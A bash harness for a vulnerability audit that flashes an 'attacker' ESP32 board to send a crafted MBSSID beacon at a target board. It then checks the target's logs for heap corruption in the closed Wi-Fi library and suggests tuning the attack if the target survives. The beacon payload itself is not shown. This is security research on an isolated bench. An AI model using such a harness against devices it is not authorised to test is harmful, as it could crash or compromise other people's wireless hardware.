#!/usr/bin/env bash
#
# 2-DUT HITL PoC for esp32-reverse audit finding 001 (MBSSID beacon
# reconstruction heap overflow in the closed libnet80211).
#
# Authorized security testing on own hardware, isolated HITL bench. Uses BOTH
# ESP32-C6 DUTs on one rig (default hitl-rig-3): target (mbssid_target: WiFi scan
# + heap-integrity watchdog) + attacker (mbssid_attacker: crafted MBSSID beacon
# via esp_wifi_80211_tx).
#
# Reservation model (IMPORTANT): a HITL lease is heartbeated only while a hitl
# command runs. `hitl reserve --keep --no-shell` BLOCKS, actively holding +
# heartbeating the lease until killed. So we launch one such holder PER DUT in
# the BACKGROUND for the whole test (DUT shows `busy` -> no other runner can
# grab/reflash it), read the reservation id it prints, drive flash/monitor via
# `--id`, then kill the holders to release. (`reserve --no-shell` WITHOUT --keep
# exits immediately and the lease then expires -> flashes 404.)
#
# Env overrides: RIG, TARGET_DUT, ATTACKER_DUT, SPLANC, BASELINE_SECS, ATTACK_SECS.
set -uo pipefail

RIG=${RIG:-http://hitl-rig-3:8087}
TARGET_DUT=${TARGET_DUT:-c6-117d10}
ATTACKER_DUT=${ATTACKER_DUT:-c6-fa3304}
SPLANC=${SPLANC:-/workspace}
BASELINE_SECS=${BASELINE_SECS:-25}
ATTACK_SECS=${ATTACK_SECS:-40}
OUT=${OUT:-/tmp/mbssid_poc}
mkdir -p "$OUT"

HITL="$SPLANC/bazel-bin/pi/hitl/cmd/hitl/hitl_/hitl"
TGT="$SPLANC/bazel-bin/firmware/secaudit/target_flashbundle.tar"
ATK="$SPLANC/bazel-bin/firmware/secaudit/attacker_flashbundle.tar"
ATK_BENIGN="$SPLANC/bazel-bin/firmware/secaudit/attacker_benign_flashbundle.tar"

echo ">> building firmware bundles..."
( cd "$SPLANC" && bazel build -c opt \
    //firmware/secaudit:target_flashbundle \
    //firmware/secaudit:attacker_flashbundle \
    //firmware/secaudit:attacker_benign_flashbundle ) || exit 1

# --- Background holders (block, heartbeating the lease) ----------------------
: > "$OUT/res_tgt.txt"; : > "$OUT/res_atk.txt"
"$HITL" reserve --server "$RIG" --device "$TARGET_DUT"   --keep --no-shell --owner mbssid-poc > "$OUT/res_tgt.txt" 2>&1 &
HOLD_TGT=$!
"$HITL" reserve --server "$RIG" --device "$ATTACKER_DUT" --keep --no-shell --owner mbssid-poc > "$OUT/res_atk.txt" 2>&1 &
HOLD_ATK=$!
cleanup() {
  echo ">> releasing (killing holders)"
  kill "$HOLD_TGT" "$HOLD_ATK" 2>/dev/null || true
  [ -n "${RES_TGT:-}" ] && "$HITL" release "$RES_TGT" --server "$RIG" 2>/dev/null || true
  [ -n "${RES_ATK:-}" ] && "$HITL" release "$RES_ATK" --server "$RIG" 2>/dev/null || true
}
trap cleanup EXIT

get_id() { # $1=file -> waits for the holder to go active + echoes id
  for _ in $(seq 1 90); do
    id=$(grep -oE '^id=[0-9a-f]+' "$1" 2>/dev/null | head -1 | cut -d= -f2)
    [ -n "$id" ] && { echo "$id"; return 0; }
    kill -0 "$2" 2>/dev/null || { echo "holder died:"; cat "$1"; return 1; }
    sleep 1
  done
  echo "timeout waiting for reservation ($1):"; cat "$1"; return 1
}

echo ">> holding both DUTs on $RIG ..."
RES_TGT=$(get_id "$OUT/res_tgt.txt" "$HOLD_TGT") || exit 1
RES_ATK=$(get_id "$OUT/res_atk.txt" "$HOLD_ATK") || exit 1
echo ">> target res=$RES_TGT ($TARGET_DUT)   attacker res=$RES_ATK ($ATTACKER_DUT)"

flash_id() { timeout 260 "$HITL" flash   --server "$RIG" --id "$1" "$2"; }
flashmon() { timeout $(( $3 + 220 )) "$HITL" flash --server "$RIG" --id "$1" --monitor --monitor-seconds "$3" "$2"; }
mon_id()   { timeout $(( $2 + 80 ))  "$HITL" monitor --server "$RIG" --id "$1" --reset --seconds "$2"; }

echo "==================== PHASE 1: baseline (benign beacon) ===================="
flash_id "$RES_ATK" "$ATK_BENIGN"
flashmon "$RES_TGT" "$TGT" "$BASELINE_SECS" | tee "$OUT/baseline.log"

echo "==================== PHASE 2: attack (malicious MBSSID beacon) ============"
flash_id "$RES_ATK" "$ATK"
mon_id "$RES_TGT" "$ATTACK_SECS" | tee "$OUT/attack.log"

echo "=========================== VERDICT ==========================="
FAULT='HEAP CORRUPTION|Guru Meditation|abort\(\)|assert failed|panic|StoreProhibited|LoadProhibited|CORRUPT HEAP|heap_ok=0'
echo "baseline heap_ok=1 lines: $(grep -c 'heap_ok=1' "$OUT/baseline.log" 2>/dev/null || echo 0)"
echo "attack   scan lines:      $(grep -c 'mbssid-target:' "$OUT/attack.log" 2>/dev/null || echo 0)"
if grep -qE "$FAULT" "$OUT/attack.log"; then
  echo "PoC RESULT: finding 001 CONFIRMED — target faulted on the crafted MBSSID beacon:"
  grep -nE "$FAULT" "$OUT/attack.log" | head
  exit 0
elif grep -q 'heap_ok=1' "$OUT/attack.log"; then
  echo "PoC RESULT: target survived — iterate kTxPadTarget/kProfileExtra in mbssid_attacker.cpp"
  exit 2
else
  echo "PoC RESULT: inconclusive — inspect $OUT/{baseline,attack}.log"
  exit 3
fi
